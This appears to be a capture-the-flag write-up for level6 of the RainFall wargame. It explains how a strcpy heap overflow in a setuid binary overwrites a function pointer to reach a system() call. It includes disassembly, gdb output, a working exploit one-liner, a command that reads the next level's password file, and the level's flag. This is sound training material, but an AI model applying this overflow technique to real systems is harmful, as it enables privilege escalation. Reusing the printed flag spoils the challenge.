# Level6

## 1. Initial Analysis
### 1.1 File Metadata & Persmissions
```bash
level6@RainFall:~$ file ./level6 
./level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
```
```bash
level6@RainFall:~$ ls -l ./level6 
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 ./level6
```
- **SetUID (s)**: The binary has the `s` bit on the owner's permissions, meaning it executes with the privileges of the file owner (`level7`) rather than the user running it (`level6`).
- **SetGID (s)**: Similarly, the group ID is set, allowing the process to inherit the `users` group permissions.
- **The Hint**: The goal is to exploit the binary to hijack its execution flow; because of these bits, any shell spawned will inherit `level7` privileges, allowing access to the next level's password.
0x804a008 first address of buffer 1

## 2. Static Analysis with Objdump

```nasm
08048454 <n>:
 8048454:	55                   	push   %ebp
 8048455:	89 e5                	mov    %esp,%ebp
 8048457:	83 ec 18             	sub    $0x18,%esp
 804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
 8048466:	c9                   	leave  
 8048467:	c3                   	ret    

08048468 <m>:
 8048468:	55                   	push   %ebp
 8048469:	89 e5                	mov    %esp,%ebp
 804846b:	83 ec 18             	sub    $0x18,%esp
 804846e:	c7 04 24 d1 85 04 08 	movl   $0x80485d1,(%esp)
 8048475:	e8 e6 fe ff ff       	call   8048360 <puts@plt>
 804847a:	c9                   	leave  
 804847b:	c3                   	ret    

0804847c <main>:
 804847c:	55                   	push   %ebp
 804847d:	89 e5                	mov    %esp,%ebp
 804847f:	83 e4 f0             	and    $0xfffffff0,%esp
 8048482:	83 ec 20             	sub    $0x20,%esp
 8048485:	c7 04 24 40 00 00 00 	movl   $0x40,(%esp)
 804848c:	e8 bf fe ff ff       	call   8048350 <malloc@plt>
 8048491:	89 44 24 1c          	mov    %eax,0x1c(%esp)
 8048495:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
 804849c:	e8 af fe ff ff       	call   8048350 <malloc@plt>
 80484a1:	89 44 24 18          	mov    %eax,0x18(%esp)
 80484a5:	ba 68 84 04 08       	mov    $0x8048468,%edx
 80484aa:	8b 44 24 18          	mov    0x18(%esp),%eax
 80484ae:	89 10                	mov    %edx,(%eax)
 80484b0:	8b 45 0c             	mov    0xc(%ebp),%eax
 80484b3:	83 c0 04             	add    $0x4,%eax
 80484b6:	8b 00                	mov    (%eax),%eax
 80484b8:	89 c2                	mov    %eax,%edx
 80484ba:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80484be:	89 54 24 04          	mov    %edx,0x4(%esp)
 80484c2:	89 04 24             	mov    %eax,(%esp)
 80484c5:	e8 76 fe ff ff       	call   8048340 <strcpy@plt>
 80484ca:	8b 44 24 18          	mov    0x18(%esp),%eax
 80484ce:	8b 00                	mov    (%eax),%eax
 80484d0:	ff d0                	call   *%eax
 80484d2:	c9                   	leave  
 80484d3:	c3                   	ret    
 80484d4:	90                   	nop
 80484d5:	90                   	nop
 80484d6:	90                   	nop
 80484d7:	90                   	nop
 80484d8:	90                   	nop
 80484d9:	90                   	nop
 80484da:	90                   	nop
 80484db:	90                   	nop
 80484dc:	90                   	nop
 80484dd:	90                   	nop
 80484de:	90                   	nop
 80484df:	90                   	nop
 ```

```bash
(gdb) x/10xw 0x804a000
0x804a000:	0x00000000	0x00000049	0x08048468	0x00000000
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000
```
0x00000049 = 72 + 1 in decimal. malloc add 1 for prev_inuse so the header value is 8


# 3. Vulnerability

strcpy copies our argv[1] into dest without bounds checking. Because dest is allocated right before the function pointer on the heap, an overflow allows us to overwrite that pointer.By replacing the function pointer with the address of function n (0x08048454, which calls system), the subsequent indirect call (call *%eax) executes system() instead of m()

# 4. Payload construction
08048454

'\x54\x84\x04\x08'

we don't use cat in this level because the command give directly the pass
```bash
(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"
```

```bash
./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
```

## flag
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d